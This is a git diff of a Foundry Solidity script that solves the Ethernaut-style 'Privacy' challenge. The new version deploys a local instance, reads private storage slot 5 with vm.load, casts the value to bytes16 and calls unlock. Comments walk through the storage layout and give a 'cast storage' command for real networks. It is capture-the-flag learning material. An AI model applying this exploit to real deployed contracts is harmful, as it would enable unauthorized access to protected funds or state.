@@ -3,60 +3,51 @@ pragma solidity ^0.8.0;
 
 import "forge-std/Script.sol";
 import "forge-std/console.sol";
+import "forge-std/console2.sol";
 import {Privacy} from "../src/Privacy.sol";
 
-// Our Instance address: https://sepolia.etherscan.io/address/0x6cf909ac30f55d920a58d4428bc6438ae7edd0c9
-
 contract PrivacySolution is Script {
-    // $ source .env      # This is to store the environmental variables in the shell session
-    // $ forge script script/Privacy.s.sol --tc PrivacySolution --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv
-
-    Privacy privacyInstance = Privacy(0x6CF909aC30F55D920A58D4428Bc6438AE7EDd0c9);
+    // $ forge script script/Privacy.s.sol --tc PrivacySolution
 
     function run() external {
-        // Deploy Privacy contract (It is better to deploy your instance for the contract to avoid errors)
-        if (address(privacyInstance) == address(0)) {
-            privacyInstance = _deployPrivacyContract();
-        }
-        // We will simulate the attack by the second address, whici is in the .env file
-        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY_2");
-        vm.startBroadcast(attackerPrivateKey);
+        bytes32[3] memory privateData = _createData("password", "hash", "string");
+        Privacy privacyInstance = new Privacy(privateData);
+
+        // --- Attack Starts from Here ---
+        address attacker = makeAddr("attacker");
+        vm.deal(attacker, 1 ether);
+        vm.startPrank(attacker);
 
         // - In the `Privacy` contract, to unlock the contract we need to know the value of the third element in the data element, then we need to get the first 16 bytes of it.
         // - The variables are private, but since the Ethereum blockchain is public we can see everything.
         // - Each slot in the EVM storage occupies 32 bytes, so let us know where are our variables.
         // - In the case of fixed size array elements are placed in the slot in sequence.
         // -
-        //      - slot0: locked
+        //      - slot0: `locked` variable
         //      - slot1: ID
-        //      - slot2: flattening && denomination && awkwardness
+        //      - slot2: `flattening` && `denomination` && `awkwardness` variables. remember if variables' sizes are less than 32 bytes they get packed together in one slot.
         //      - slot3: data[0]
         //      - slot4: data[1]
         //      - slot5: data[2]
         //
         // - So we can simply read the 5th slot in the storage, then cast it into bytes16() and we will get the right key that will unlock the Privacy contract, and pass the challenge.
-        // - Here is how to cast storage in Foundry:
-        //  `cast storage <CONTRACT_ADDRESS> <STORAGE_SLOT> --rpc-url <RPC_URL>`
 
-        // How to read the Storage variables using Foundry:
-        // source .env    # If you didn't reference to your environmental variables
-        // cast storage <CONTRACT_ADDRESS> <STORAGE_SLOT> --rpc-url $SEPOLIA_RPC_URL
+        bytes32 slot5Value = vm.load(address(privacyInstance), bytes32(uint256(5))); // Reading the 5th slot in the `Privacy` contract
+        bytes16 key = bytes16(slot5Value); // casting it into `bytes16`
+        console.log("key:");
+        console.logBytes16(key);
+        console.log("-------------");
         console.log("Privacy lock:", privacyInstance.locked());
-        privacyInstance.unlock(0x97fc46276c172633607a331542609db1);
+        console.log("fire unlock(key) ...");
+        privacyInstance.unlock(key);
         console.log("Privacy lock:", privacyInstance.locked());
 
-        vm.stopBroadcast();
-    }
-
-    function _deployPrivacyContract() internal returns (Privacy) {
-        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
-        vm.startBroadcast(deployerPrivateKey);
-        // You can use any three wards to make your data
-        bytes32[3] memory data = _createData("password", "hash", "string");
-        Privacy privacyInstance = new Privacy(data);
-        console.log("Privacy address:", address(privacyInstance));
-        vm.stopBroadcast();
-        return privacyInstance;
+        vm.stopPrank();
+        // NOTE:
+        // --------------------
+        // In case you are deailing with contracts that are deployed in real networks, you can use `cast` instead.
+        // Here is an example of how to read storage from contracts deployed on real networks
+        // $ cast storage <YOUR_VAULT_INSTANCE_ADDRESS> <SLOT_NUMBER> --rpc-url <YOUR_RPC_URL>
     }
 
     function _createData(string memory str1, string memory str2, string memory str3)
